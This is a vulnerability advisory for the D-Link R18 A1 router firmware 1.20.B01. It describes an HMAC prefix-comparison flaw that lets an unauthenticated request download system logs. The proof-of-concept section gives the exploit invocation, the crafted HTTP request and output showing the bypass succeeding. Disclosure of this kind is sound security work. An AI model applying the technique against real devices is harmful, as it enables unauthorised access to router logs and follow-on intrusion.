# D-Link R18 A1 One-Byte HMAC Prefix Authentication Bypass and System Log Disclosure

## Title

D-Link R18 A1 1.20.B01 DHMAPI `API-AUTH` One-Byte HMAC Prefix Authentication Bypass and Unauthenticated System Log Disclosure

## Description

### 1. Vulnerability Name

The DHMAPI session validator uses the attacker-controlled supplied-hash length as the HMAC comparison length. A one-byte hash prefix is sufficient to pass authentication and download system logs without a password.

### 2. Vulnerability Contributor and Submitter

- **Researcher**: Lumina
- **Contact**: 1547800591@qq.com

### 3. Vendor and Product Information

- **Vendor**: D-Link Corporation
- **Vendor homepage**: https://www.dlink.com/
- **Product**: D-Link R18 A1 Router Operating System
- **Component**: DHMAPI session authentication and log download, `/bin/httpd`
- **Vulnerable function**: `is_session_valid` at `0x42b608`
- **Confirmed endpoint**: `POST /DHMAPI/dllog.cgi`
- **Affected header**: `API-AUTH`

![image-20261105190755553](R18A1-FW120B01-HMAC-prefix-authentication-bypass.EN.assets/image-20261105190755553.png)

### 4. Affected Version

- **Firmware**: `1.20.B01` (`R18A1_FW120B01.bin`)
- **Runtime version string**: `1.20.01`
- **Firmware SHA-256**: `3d6eba2059034d4148543acb7894c81633ce406756287eba2573d323a785a01d`
- **Decrypted firmware SHA-256**: `11cfca751130b979bad3d00cb8b442bd91fd54c134b290070fed6b195a38db24`
- **`httpd` SHA-256**: `a73f1bf1a4cb8bc86d7b2e34a50dcb54dce559a001455b4f6942294b72f43cc3`
- **Architecture**: MIPS32 little-endian, uClibc, Linux 3.18.21

### 5. Vulnerability Class and Attack Conditions

- **Vulnerability class**: Improper verification of cryptographic signature and authentication bypass
- **CWE**: CWE-347 (Improper Verification of Cryptographic Signature)
- **Attack vector**: Adjacent network by default, or remote networks if the management interface is exposed
- **Authentication required**: No; an unauthenticated challenge cookie is sufficient
- **User interaction required**: No
- **Confirmed impact**: System log disclosure without valid credentials

### 6. Severity

The expected SHA-256 HMAC is represented by 64 hexadecimal characters, but the server compares only as many characters as the attacker supplies. A one-character value reduces authentication to four bits. Trying the 16 possible uppercase hexadecimal characters guarantees a match for a fixed action and timestamp. The system-log download path does not enforce the separate `API-CONTENT` check used by ordinary HNAP actions, so the weak comparison directly exposes device logs.

### 7. Vulnerability Description

An attacker first sends an unauthenticated `Login` challenge request and receives a session cookie. No password or successful login submission is needed. The attacker then sends a log-download request with a one-byte `API-AUTH` hash prefix and a fixed timestamp.

The vulnerable comparison is equivalent to:

```c
strncmp(expected_hmac, supplied_hmac, strlen(supplied_hmac));
```

When `supplied_hmac` has length one, the comparison checks only the first hexadecimal character. `check_timestamp_tolerable` at `0x42b3b4` accepts reuse of the same timestamp within its tolerance logic, allowing all 16 candidate prefixes to be tested against the same expected HMAC.

### 8. Technical Details and Root Cause

#### Attacker-controlled comparison length

`is_session_valid` parses the supplied HMAC into a local buffer, computes the expected HMAC-SHA256 value, and calls `strncmp` with `strlen(supplied_hmac)`. There is no requirement that the supplied value contain exactly 64 hexadecimal characters.

This produces an online prefix oracle:

- An incorrect full-length value returns HTTP 401.
- An incorrect one-byte prefix also returns HTTP 401.
- The correct one-byte prefix passes `is_session_valid` and reaches the download handler.

#### Log download lacks a second content-authentication barrier

The system-log path uses `serv_9` at `0x4282dc`. After the weak session validation, `put_data_8` at `0x428100` generates `/tmp/www3/logmsg.txt` and returns its contents. Unlike normal DHMAPI setting actions, this path does not require a valid `API-CONTENT` header.

The related QuickVPN export path uses the same session validator. A one-byte prefix was accepted there as well, but the emulated profile file was zero bytes. No VPN credential disclosure is claimed from that test.

### 9. Proof of Concept

The self-contained Python 3 exploit requires only the standard library. It obtains a challenge-only cookie, verifies that a full-length invalid HMAC returns HTTP 401, tries all one-byte hexadecimal prefixes, and saves returned log data:

```bash
python3 ./r18_f5_hmac_prefix_bypass.py
```

Default settings:

- **Target**: `192.168.135.137`
- **Web port**: `18080`
- **Output file**: `F5_syslog.txt`

For direct access inside the emulation VM:

```bash
python3 ./r18_f5_hmac_prefix_bypass.py \
  --host 192.168.0.1 --web-port 80 --output F5_syslog.txt
```

The effective request is:

```http
POST /DHMAPI/dllog.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded
API-ACTION: SyslogDownload
API-AUTH: <one hexadecimal character> <fixed timestamp>
Cookie: uid=<challenge-response cookie>

x=1
```

Observed result from the final host-side test:

```text
[+] Challenge-only request returned HTTP 200; no password submitted
[*] Invalid full-length HMAC control: HTTP 401, bytes=0
[*] One-byte HMAC '0': HTTP 401, bytes=0
...
[*] One-byte HMAC 'D': HTTP 401, bytes=0
[*] One-byte HMAC 'E': HTTP 200, bytes=1460
[+] F5 succeeded: system logs were downloaded without a password
```

The response contained actual kernel, process, network-service, and `commander` log records. The invalid-full-HMAC control excludes the possibility that the log endpoint was intentionally public.

![image-20261105191558053](R18A1-FW120B01-HMAC-prefix-authentication-bypass.EN.assets/image-20261105191558053.png)

### 10. Impact

An unauthenticated attacker can download operational logs that may reveal internal network details, service state, configuration events, debugging information, and data useful for follow-on attacks. Other endpoints using `is_session_valid` without an independent content-integrity check may also be affected. This report does not claim that every HNAP setting action is accessible without the separate `API-CONTENT` key.

### 11. Repair Plan

1. Require exactly 64 valid hexadecimal characters for a SHA-256 HMAC and reject all other lengths.
2. Compare the complete 32-byte digest using a constant-time comparison function; never derive comparison length from attacker input.
3. Enforce timestamp freshness and reject replay of an identical timestamp for the same session and action.
4. Apply uniform authentication and authorization to log, configuration, and VPN export endpoints.
5. Add rate limits and account-independent challenge throttling to prevent online authentication oracles.
6. Test HMAC lengths of 0, 1, 63, 64, and 65 bytes, invalid hexadecimal characters, and repeated timestamps.

### 12. Verification and Disclosure Notes

- **Evidence level**: VALIDATED through end-to-end authentication bypass and log disclosure in full-system FirmAE/QEMU emulation.
- The Web frontend and original `httpd` backend were running; no authentication function was patched.
- The final self-contained exploit was executed from the host through `192.168.135.137:18080`.
- The exploit captures the returned log data for evidence; its default output is `F5_syslog.txt`.
- QuickVPN returned HTTP 200 with a weak prefix but produced a zero-byte profile in emulation.

The following supporting file is attached:

- `exploits/r18_f5_hmac_prefix_bypass.py` — self-contained one-click authentication bypass and log-download exploit.
